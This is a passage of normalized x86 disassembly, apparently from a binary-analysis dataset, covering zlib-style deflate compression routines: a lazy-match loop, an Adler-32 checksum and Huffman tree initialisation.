xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
xor ecx ecx
mov cl [ edx ]
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x30 ]
jb r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
xor eax eax
mov al [ ecx ]
cmp edx eax
jne r-xdata
sub_404e49
push ebp
mov ebp esp
sub esp 0x2c
push ebx
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x3
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4042f0
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x6c ] 0x106
jae r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x58 ]
mov [ edx + 0x70 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x68 ]
mov [ edx + 0x5c ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x2
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x70 ] 0x3
jb r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x70 ]
cmp edx [ ecx + 0x78 ]
jae r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x58 ]
cmp eax [ edx + 0x70 ]
ja r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
sub ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
sub eax 0x106
cmp ecx eax
ja r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx + 0x60 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov dl [ ecx + edx - 0x1 ]
mov [ ebp - 0x18 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov [ eax + ecx * 2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1690 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov al [ ebp - 0x18 ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1698 ] edx
mov ecx [ ebp - 0x18 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x8c ]
add ax 0x1
mov ecx [ ebp - 0x18 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
lea edx [ edx + ecx - 0x3 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x70 ]
sub ecx 0x3
mov [ ebp - 0x14 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
sub eax [ ecx + 0x5c ]
mov [ ebp - 0x10 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x169c ]
mov cx [ ebp - 0x10 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1690 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
mov cl [ ebp - 0x14 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1698 ] eax
mov dx [ ebp - 0x10 ]
sub dx 0x1
mov [ ebp - 0x10 ] dx
mov eax [ ebp - 0x14 ]
and eax 0xff
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x490 ]
add ax 0x1
mov ecx [ ebp - 0x14 ]
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + edx * 4 + 0x490 ] ax
mov edx [ ebp - 0x10 ]
and edx 0xffff
cmp edx 0x100
jge r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x80 ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov dl [ ecx + edx - 0x1 ]
mov [ ebp - 0x1c ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov [ eax + ecx * 2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1690 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov al [ ebp - 0x1c ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1698 ] edx
mov ecx [ ebp - 0x1c ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x8c ]
add ax 0x1
mov ecx [ ebp - 0x1c ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x60 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x106
jae r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x54 ] 0x0
jl r-xdata
mov edx [ ebp - 0x10 ]
and edx 0xffff
sar edx 0x7
xor eax eax
mov al [ edx + r--data ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x10 ]
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x58 ] 0x5
ja r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_404b1a
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] eax
mov [ ebp - 0x2c ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x2c ] ecx
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x54 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x70 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x70 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x70 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x980 ]
add ax 0x1
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x980 ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x70 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
sub ecx edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x70 ]
sub ecx 0x2
mov edx [ ebp + 0x8 ]
mov [ edx + 0x70 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x80 ] 0x1
je r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x4
neg eax
sbb eax eax
and al 0xfe
add eax 0x3
xor eax eax
cmp [ ebp + 0xc ] 0x4
setne al
dec eax
and eax 0x2
jmp r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x4
sete al
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
sub eax [ edx + 0x54 ]
push eax
mov ecx [ ebp - 0x2c ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_405fb2
add esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov [ eax + 0x54 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
call sub_403ba0
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
push 0x0
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x54 ]
push ecx
mov edx [ ebp - 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_405fb2
add esp 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov [ ecx + 0x54 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_403ba0
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
cmp ecx [ ebp - 0xc ]
ja r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x60 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x64 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x2
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x58 ] 0x3
jne r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x68 ]
cmp ecx 0x1000
jbe r-xdata
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x24 ] ecx
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
push edx
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_405fb2
add esp 0x10
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov [ edx + 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call sub_403ba0
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
sub_40555e
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call calloc
add esp 0x8
pop ebp
retn
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
add ecx eax
mov [ ebp + 0xc ] ecx
sub_4055a0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
and eax 0xffff
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
shr ecx 0x10
and ecx 0xffff
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x10
or eax [ ebp - 0x4 ]
cmp [ ebp + 0x10 ] 0x15b0
jae r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x15b0
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x1 ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x2 ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x3 ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x5 ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x6 ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x7 ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x9 ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0xa ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0xb ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0xc ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0xd ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0xe ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0xf ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
add eax 0x10
mov [ ebp + 0xc ] eax
mov ecx [ ebp - 0xc ]
sub ecx 0x10
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x10 ]
sub ecx [ ebp - 0xc ]
mov [ ebp + 0x10 ] ecx
mov eax [ ebp - 0x4 ]
xor edx edx
mov ecx 0xfff1
div ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov ecx 0xfff1
div ecx
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0xc ]
add edx 0x1
mov [ ebp + 0xc ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
sub ecx 0x1
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x10
jl r-xdata
sub_405820
push ebp
mov ebp esp
call sub_4058b6
mov eax [ ebp + 0x8 ]
add eax 0x8c
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb10 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0xb18 ] rw-data
mov eax [ ebp + 0x8 ]
add eax 0x980
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb1c ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0xb24 ] rw-data
mov eax [ ebp + 0x8 ]
add eax 0xa74
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb28 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0xb30 ] rw-data
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16ac ] 0x8
mov eax [ ebp + 0x8 ]
push eax
call sub_4058bb
add esp 0x4
pop ebp
retn
sub_4058bb
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x11e
jge r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1e
jge r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x980 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x13
jge r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x48c ] 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16a4 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16a0 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a8 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1698 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0xa74 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_405984
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x14 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x8 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x4 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
push 0x1
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_408b02
add esp 0x10
mov esp ebp
pop ebp
retn
sub_405ac3
push ebp
mov ebp esp
sub esp 0x20
mov [ ebp - 0x4 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx 0x2
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov [ ebp - 0x8 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
